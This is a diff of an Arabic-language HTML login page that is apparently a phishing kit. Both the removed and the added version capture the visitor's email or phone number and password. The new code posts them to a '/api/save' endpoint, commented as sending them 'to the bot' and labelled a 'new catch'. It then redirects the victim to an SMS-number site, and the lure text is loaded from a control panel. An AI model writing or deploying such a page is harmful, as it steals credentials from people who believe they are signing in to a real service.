@@ -3,38 +3,174 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل الخدمة</title>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <title>تسجيل الدخول</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #e91e63; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; }
-        .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: right; }
-        button { width: 100%; padding: 12px; background: #e91e63; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        /* إعدادات الجسم والخلفية */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); /* خلفية ناعمة مريحة للعين */
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* حاوية البطاقة الرئيسية */
+        .login-card {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 20px; /* حواف مستديرة جميلة */
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1); /* ظل ناعم يعطي عمقاً */
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        /* تنسيق الصورة */
+        #pageImg {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%; /* صورة دائرية */
+            object-fit: cover;
+            margin-bottom: 20px;
+            border: 3px solid #f0f2f5;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        /* تنسيق النص (العنوان) */
+        h2 {
+            color: #333;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        /* تنسيق حقول الإدخال */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 16px;
+            border: 2px solid #e1e4e8;
+            border-radius: 12px; /* حواف مستديرة للحقول */
+            outline: none;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            background-color: #f8f9fa;
+        }
+
+        input:focus {
+            border-color: #007bff; /* يتغير اللون عند الضغط */
+            background-color: #fff;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
+        }
+
+        /* تنسيق رسالة الخطأ */
+        .error-msg {
+            color: #d9534f;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* تنسيق الزر الجذاب */
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #007bff, #0056b3); /* تدرج لوني للزر */
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-2px); /* تأثير ارتفاع بسيط عند المرور بالماوس */
+            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://telegra.ph/file/1792945d7d91986420551.jpg" width="120" style="margin-bottom:15px;">
-        <h2 style="color:#c2185b; font-size:18px;">سجل دخولك لتفعيل خدمة الأرقام</h2>
-        <form id="F">
-            <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="p" placeholder="كلمة السر" required>
-            <div class="cf-turnstile" data-sitekey="1x00000000000000000000AA" data-callback="v"></div>
-            <button type="submit">تسجيل دخول</button>
+
+    <div class="login-card">
+        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
+        
+        <h2 id="pageLetter">سجل دخولك للمتابعة</h2>
+
+        <form id="authForm">
+            <div class="input-group">
+                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <div id="userError" class="error-msg">⚠️ يرجى إدخال بريد أو هاتف صحيح</div>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="passInput" placeholder="كلمة السر" required>
+            </div>
+
+            <button type="submit" id="pageBtn">تسجيل الدخول</button>
         </form>
     </div>
+
     <script>
-        let ok = false; function v() { ok = true; }
-        document.getElementById('F').onsubmit = async (e) => {
+        // دالة جلب البيانات لتحديث الصورة والنصوص تلقائياً من اللوحة
+        async function fetchSettings() {
+            try {
+                const response = await fetch('/api/get');
+                const data = await response.json();
+                if(data.image) document.getElementById('pageImg').src = data.image;
+                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
+                if(data.button) document.getElementById('pageBtn').innerText = data.button;
+            } catch (e) { console.log("استخدام الإعدادات الافتراضية"); }
+        }
+        window.onload = fetchSettings;
+
+        // التحقق من الإدخال والإرسال
+        const form = document.getElementById('authForm');
+        form.onsubmit = async (e) => {
             e.preventDefault();
-            if(!ok) return Swal.fire('تنبيه', 'يرجى إكمال التحقق', 'warning');
-            let b = "N/A"; try { const bat = await navigator.getBattery(); b = Math.floor(bat.level * 100) + "%"; } catch(e){}
+            
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
+            const errorText = document.getElementById('userError');
+
+            // منطق التحقق البسيط
+            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
+            const isPhone = /^\+?[0-9]{7,15}$/.test(user);
+
+            if (!isEmail && !isPhone) {
+                errorText.style.display = 'block';
+                document.getElementById('userInput').style.borderColor = '#d9534f';
+                return;
+            }
+
+            // إرسال البيانات للبوت
             await fetch('/api/save', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user: document.getElementById('u').value, pass: document.getElementById('p').value, device: navigator.platform, battery: b })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    image: "✅ صيد جديد مرتب",
+                    letter: "اليوزر: " + user,
+                    button: "الباسورد: " + pass
+                })
             });
+
+            // تحويل المستخدم لموقع الجوائز أو الأرقام
             window.location.href = "https://receive-smss.com/";
         };
     </script>
